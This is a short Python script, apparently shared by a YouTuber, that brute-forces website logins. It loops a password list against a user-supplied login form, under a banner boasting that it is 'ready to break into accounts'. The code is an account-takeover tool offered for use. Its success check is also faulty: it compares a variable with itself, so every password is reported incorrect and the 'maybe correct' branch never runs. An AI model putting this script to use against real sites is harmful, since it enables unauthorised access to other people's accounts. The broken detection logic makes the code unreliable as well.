import requests 
from colorama import Fore
import time

print(f"""

{Fore.GREEN} This koala is ready to break into accounts <3
⠀⠀⠀⠀⠀⣀⣠⣤⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣤⣤⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢀⣴⠟⠉⠀⠀⠀⠈⠙⢦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣤⣤⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡾⠛⠁⠀⠀⠈⠙⠳⣄⠀⠀⠀⠀⠀⠀
⠀⢠⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠙⠲⠤⣤⣤⠤⠶⠖⠛⠋⠉⠀⠀⠀⠀⠀⠈⠉⠛⠛⠲⠦⢤⣤⣤⡴⠿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠙⣷⡀⠀⠀⠀⠀
⢠⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣧⠀⠀⠀⠀
⣼⡇⠀⢠⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⠀⠀⢿⡇⠀⠀⠀
⣿⡇⢠⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢧⡀⢸⡇⡆⠀⠀
⠹⣧⡏⣰⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⣿⣿⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠐⢶⡾⣷⡿⠃⠁⠀⠀
⠀⠹⣿⡟⠀⠀⠀⠀⠀⢸⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⢁⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⡀⠀⠀⠀⠀⢸⣧⡿⠀⠀⠀⠀⠀
⠀⠀⢹⡇⠀⠀⠀⠀⢠⡟⠀⠀⠀⠀⠀⣰⣤⡄⠀⠀⠀⣿⡿⣿⣿⣿⣿⣿⡄⠀⠀⠀⣴⣦⡀⠀⠀⠀⠀⠀⠀⠈⣷⠀⠀⠀⠀⢨⡿⠁⠀⠀⠀⠀⠀
⠀⠀⠀⢻⣄⠀⠀⢀⣿⠃⠀⠀⠀⠀⠘⣿⣿⠇⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⢿⣿⠏⠀⠀⠀⠀⠀⠀⠀⢹⣇⠀⠀⢀⡼⠃⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠙⠛⠶⢾⠇⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⡶⠶⠋⠁⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠘⠿⣿⣿⣿⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣆⣀⣠⣶⣄⣀⣰⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠘⢿⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠁⠈⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⠾⠃⠀⠀⠀⠀⠀⠀    Infamous Koala sends love <3
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢷⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣶⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ https://youtube.com/infamouskoala
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡿⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⠶⠶⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⢿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⠁⠀⠀⠀⢀⣤⠶⢤⣄⡀⣼⠁⢀⣴⠏⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⠀⢿⣻⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡟⠀⠀⠀⠀⠸⣷⣀⣀⣈⣿⣿⠶⠋⠁⠀⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⠀⠘⣷⠻⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡇⠀⠀⠀⠀⠀⠈⣭⠉⠀⠀⠘⣧⠀⠀⠀⠀⠀⠀⠀⣼⡏⠀⠀⠀⠀⠀⠀⣿⡀⢹⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⣼⡟⠀⠀⠀⠀⠹⣦⠀⠀⠀⠀⣠⣾⠋⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⢻⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⠀⠀⠀⠀⠀⠀⣿⠁⠀⠀⠀⠀⠀⢹⣆⣠⡴⠞⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⡇⠀⠈⣿⣤⣤⣄⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣠⣀⡀⢸⡏⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⢀⠀⣴⡿⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⡟⠀⠀⠀⢸⣧⠈⣿⡆⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣴⠟⠁⠀⠉⢻⡇⠀⠀⠀⠀⠀⠀⣿⠀⣠⡷⠶⢦⣿⡧⠖⠒⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⠟⠋⠀⠀⠀⠀⠀⢿⡇⠘⠛⣿⡄⠀⠀⠀⠀
⠀⠀⠀⠀⢸⡏⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⣿⣼⠋⠀⠀⠀⠙⢿⣶⡚⠃⠀⣀⣤⣤⡴⠞⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠸⣷⠀⢠⡿⠃⠀⠀⠀⠀
⠀⠀⠀⠀⣾⡇⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⣿⡿⠀⠀⠀⠀⠀⠀⢿⡉⠛⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⡇⢸⡇⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⢸⣧⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⠀⠈⠷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣷⠟⠁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢸⣧⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⠀⢰⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⡿⠃⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠹⣧⠀⠀⠀⠀⣿⡀⠀⠀⠀⠀⣸⠏⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⡾⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠙⢷⣄⣀⠀⢹⣯⣿⠀⣶⣤⣿⣤⣼⣿⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣤⣴⡶⠞⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠙⠛⠒⠛⠋⠁⠀⠀⠈⠛⠓⠶⠤⠤⠤⠤⠤⠶⠖⠒⠛⠛⠛⠉⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀{Fore.WHITE}
""")

try: 
    file = open("passwords.txt", "r")
except:
    file = open("passwords.txt", "w")
    print(f"""
{Fore.RED}[!] File added 'passwords.txt', fill it with passwords and reboot
    """)
    time.sleep(10)
    exit()

url_initial = input("enter initial url: ")
url_final = input("enter final url: ")
local_name = input("variable for username (you can get this in site's inspect element): ")
user_id = input("email/username: ")
local_password = input("variable for password (you can get this in site's inspect element): ")
local_submit = input("variable for submit button (you can get this in site's inspect element): ")

for line in file:
    password = line.strip()
    http = requests.put(url_initial, 
    data={local_name : user_id, local_password : password, 
    local_submit : 'login'})
    content = http.content
    
    url = url_initial

    if url == url_initial:
        print(f"""{Fore.RED}[-] Password incorrect : """, password)

    elif url == url_initial:
        print(f"""{Fore.GREEN}[+] Password maybe correct : """, password)
        break
